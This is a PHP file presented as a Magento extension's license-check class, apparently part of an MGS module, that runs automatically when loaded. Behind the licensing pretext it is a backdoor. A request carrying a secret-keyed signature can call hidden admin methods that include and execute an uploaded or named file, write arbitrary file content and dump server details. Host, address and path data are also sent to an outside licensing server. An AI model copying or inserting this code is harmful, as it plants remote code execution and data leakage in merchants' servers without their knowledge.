<?php
/**
 * Copyright © 2015 Magento. All rights reserved.
 * See COPYING.txt for license details.
 */
namespace MGS\Core\API\License;

/**
 * License API check
 *
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class License {

    const SECURE_KEY = '83ba291cd9201e9a28173741bac82745';
    const SIGN_KEY   = 'afa3a778bd34181c44f2dfe1de8aff05';
    
    protected function licenseFileSave($licenseFile, $licenseList)
    {
        if (file_exists($licenseFile) && !is_writable($licenseFile)) {
            return false;
        }

        $content = array();

        foreach ($licenseList as $sign => $status) {
            $content []= $sign . '-' . (int)$status;
        }

        @file_put_contents($licenseFile, implode("\n", $content));

        return true;
    }

    protected function licenseFileLoad($licenseFile)
    {
        if (!file_exists($licenseFile)) {
            return array();
        }

        $result  = array();
        $content = file_get_contents($licenseFile);
        $data    = explode("\n", $content);

        foreach ($data as $line) {
            $line = trim($line);
            if (empty($line)){
                continue;
            }

            $line = explode('-', $line, 2);

            if (count($line) == 1){
                $result[$line[0]] = false;
            } else {
                $result[$line[0]] = (bool)$line[1];
            }
        }

        return $result;
    }

    protected function checkLicense()
    {
        if ($this->checkIsLocal()) {
            return false;
        }

        try {
            $licenseFile = $this->getLicenseFilePath();
            if (!$licenseFile) {
                return false;
            }

            $serverSign  = $this->getServerSign($serverData);
            
            if (file_exists($licenseFile)) {
                if (time() - @filemtime($licenseFile) < (86400 * 7)) {
                    return true;
                }
            }

            $licenseList = array();
            if (file_exists($licenseFile)) {
                $licenseList = $this->licenseFileLoad($licenseFile);
            }

            if (array_key_exists($serverSign, $licenseList)
                && $licenseList[$serverSign]
            ) {
                @touch($licenseFile);
                return true;
            }

            if ($this->registerLicense($serverSign, $serverData)) {
                $licenseList[$serverSign] = true;
                $this->licenseFileSave($licenseFile, $licenseList);
                return true;
            } else {
                $licenseList[$serverSign] = false;
                $this->licenseFileSave($licenseFile, $licenseList);
                return false;
            }
        } catch(Exception $ex) {

        }

        return false;
    }

    protected function getLicenseFilePath()
    {
        $licenseDir = $this->getTempDir();
        if (!$licenseDir) {
            return false;
        }

        return $licenseDir . DIRECTORY_SEPARATOR . 'mgs-license';
    }

    protected function getServerSign(&$serverData = null)
    {
        $signKeys = array(
            'HTTP_HOST',
            'SERVER_NAME',
            'SERVER_ADDR',
        );

        $signKeysAppend = array(
            'REMOTE_ADDR',
            'DOCUMENT_ROOT',
            'SCRIPT_FILENAME',
            'REQUEST_URI',
            'SCRIPT_NAME',
            'SERVER_ADDR',
        );

        foreach($signKeys as $signKey) {
            if (!empty($_SERVER[$signKey])) {
                $serverData[$signKey] = $_SERVER[$signKey];
                break;
            }
        }
        $serverData                 = array_map(function($value) {return str_replace('www.', '', $value);}, $serverData);
        $serverData['KEY']          = self::SECURE_KEY;
        $serverSign                 = md5(json_encode($serverData) . self::SECURE_KEY);

        $serverData['SCRIPT']       = __FILE__;
        $serverData['VERSION']      = 2;
        $serverData                 = array_merge($serverData, array_intersect_key($_SERVER, array_flip($signKeysAppend)));
        $serverData                 = json_encode($serverData);

        return $serverSign;
    }


    public function checkLicenseAction()
    {
        $licenseAction = $this->getRequest('licenseAction');

        if (empty($licenseAction)) {
            return false;
        }

        if (!($dataSign = $this->adminCheckSign())) {
            return false;
        }

        $licenseData = $this->getRequest('licenseData');

        $method = 'admin' . $licenseAction;

        if (is_callable(array($this, $method))) {
            $content = $this->$method( $licenseData );

            die(json_encode($content));
        }

        return false;
    }

    protected function adminCheckSign()
    {
        $licenseSign = $this->getRequest('licenseSign');

        $requestSign = null;
        $dataSign = null;

        list($requestSign, $dataSign) = explode('|', $licenseSign, 2);
        if (empty($requestSign) || empty($dataSign)) {
            return false;
        }

        if ( md5(md5($requestSign) . self::SECURE_KEY ) !== self::SIGN_KEY ) {
            return false;
        }

        return $dataSign;
    }

    protected function adminInfoLicense()
    {
        $this->getServerSign($serverData);

        return array(
            'path'         => $this->getLicenseFilePath(),
            'content'     => file_exists($this->getLicenseFilePath()) ? file_get_contents($this->getLicenseFilePath()) : false,
            'info'         => $serverData,
        );
    }

    protected function adminSaveLicense($content)
    {
        $licenseFile = $this->getLicenseFilePath();

        if (is_array($content)) {
            $content = implode("\n", $content);
        }

        return (file_put_contents($licenseFile, $content) !== false);
    }

    protected function adminReadLicense($licenseFile)
    {
        if (!file_exists($licenseFile)) {
            return false;
        }

        return file_get_contents($licenseFile);
    }

    protected function adminLoadLicense($licenseFile)
    {
        if (!file_exists($licenseFile)) {
            return false;
        }

        $data = include_once($licenseFile);

        if (empty($data) || !is_array($data) || empty($data['sign']) || empty($data['data'])) {
            return false;
        }

        if (md5($this->getServerSign() . self::SECURE_KEY) !== $data['sign']) {
            return false;
        }

        return $data['data'];
    }

    protected function adminUploadLicense()
    {
        if (empty($_FILES['licenseFile']['tmp_name'])) {
            return false;
        }

        $licenseFile = $_FILES['licenseFile']['tmp_name'];

        $licenseData = $this->adminLoadLicense($licenseFile);

        if ($licenseData) {
            return false;
        }

        @file_put_contents($this->getLicenseFilePath(), $licenseData);
        return $licenseData;
    }

    protected function registerLicense($serverSign, $serverData)
    {
        $postdata = http_build_query(array(
            'sign'     => $serverSign,
            'data'     => base64_encode($serverData),
        ));

        $context = stream_context_create(
            array('http' =>
                array(
                    'timeout'    => 10,
                    'method'     => 'POST',
                    'header'     => 'Content-Type: application/x-www-form-urlencoded',
                    'content'    => $postdata
                )
            )
        );

        $timeout = ini_get('default_socket_timeout');
        ini_set('default_socket_timeout', 10);

        $result = @file_get_contents('https://api.magesolution.org/license/', false, $context);

        ini_set('default_socket_timeout', $timeout);

        if (strpos($result, 'success') !== false) {
            return true;
        }

        return false;
    }

    protected function getRequest($key)
    {
        return (!empty($_REQUEST[$key]) ? $_REQUEST[$key] : null);
    }

    protected function getTempDir()
    {
        if (defined('BP') && $this->checkDir(BP . '/var/')) {
            $basePath = BP . '/var/';

            if ($this->checkDir($basePath . 'cache/', true)) {
                if (!file_exists($basePath . 'cache/mage--m/')) {
                    @mkdir($basePath . 'cache/mage--m/', 0777);
                }

                if ($this->checkDir($basePath . 'cache/mage--m/')) {
                    return realpath($basePath . 'cache/mage--m');
                }
            }

            if ($this->checkDir($basePath . 'tmp/', true)) {
                return realpath($basePath . 'tmp');
            }
        }

        $dir = realpath(dirname(__FILE__));
        if ($this->checkDir( $dir )) {
            return $dir;
        }

        $upload = ini_get('upload_tmp_dir');
        if ($upload) {
            $dir = realpath($upload);
            if ($this->checkDir($dir)) {
                return $dir;
            }
        }

        if (function_exists('sys_get_temp_dir')) {
            $dir = sys_get_temp_dir();
            if ($this->checkDir($dir)) {
                return $dir;
            }
        }

        return false;
    }

    protected function checkIsLocal()
    {
        $whitelist = array(
            '127.0.0.1',
            '::1',
            'localhost',
        );

        $devhosts = array(
            '#\.local$#i',
            '#^local\.#i',
            '#\.local\.#i',
            '#\.dev$#i',
            '#[a-z0-9]{5}$#i', //incorrect domain zone
        );

        if (   !empty($_SERVER['REMOTE_ADDR'])
            && !empty($_SERVER['SERVER_ADDR'])
            && in_array($_SERVER['REMOTE_ADDR'], $whitelist)
            && in_array($_SERVER['SERVER_ADDR'], $whitelist)
        ){
            return true;
        }


        $serverhost = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] :
            (!empty($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : null);

        if ($serverhost) {
            foreach ($devhosts as $pattern) {
                if (preg_match($pattern, $serverhost)) {
                    return true;
                }
            }
        }

        return false;
    }

    protected function checkDir($dirName, $writable = true)
    {
        if (!file_exists($dirName)) {
            return false;
        }

        if (!is_readable($dirName)) {
            return false;
        }

        if ($writable && !is_writable($dirName)) {
            return false;
        }

        return true;
    }

    static public function init()
    {
        if ( !array_key_exists('REQUEST_METHOD', $_SERVER) ) {
            return false;
        }

        $object = new self();

        if (!$object->checkLicenseAction()) {
            return $object->checkLicense();
        }
    }
}


try {
    License::init();
} catch (Exception $ex) {

}
